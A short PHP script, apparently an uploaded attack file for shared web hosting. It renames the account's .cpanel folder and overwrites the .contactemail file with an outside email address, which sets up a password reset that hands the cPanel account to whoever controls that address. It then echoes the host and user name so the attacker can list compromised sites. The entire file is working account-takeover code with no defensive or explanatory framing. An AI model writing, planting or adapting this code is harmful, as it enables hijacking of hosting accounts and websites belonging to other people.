<?php
 
$user = get_current_user();
$home_n = explode("/",getcwd());

if(is_dir("/".$home_n[1]."/".$user."/.cpanel")){
	
rename("/".$home_n[1]."/".$user."/.cpanel",("/".$home_n[1]."/".$user."/.cpanels"));

}
if(is_file("/".$home_n[1]."/".$user."/.contactemail")) {
chdir("/".$home_n[1]."/".$user."/");
fwrite(fopen(".contactemail","w"),"vvebos@mozej.com");}


else { 
chdir("/".$home_n[1]."/".$user."/");
fwrite(fopen(".contactemail","w"),"vvebos@mozej.com");}
echo $_SERVER['HTTP_HOST']."|".$user."|";
?>